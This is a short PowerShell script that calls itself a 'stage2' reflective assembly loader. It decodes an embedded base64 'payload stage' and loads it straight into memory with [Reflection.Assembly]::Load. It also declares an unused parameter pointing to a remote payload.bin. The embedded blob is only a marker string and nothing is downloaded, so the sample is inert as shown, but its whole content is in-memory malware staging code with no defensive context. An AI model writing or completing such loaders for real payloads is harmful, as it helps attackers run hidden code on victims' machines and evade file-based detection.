<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://example.com:443/payload.bin',
    [int]$TimeoutSec = 15
)
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp0cGNvNXdldnRn")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $TransferResult) {
        Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
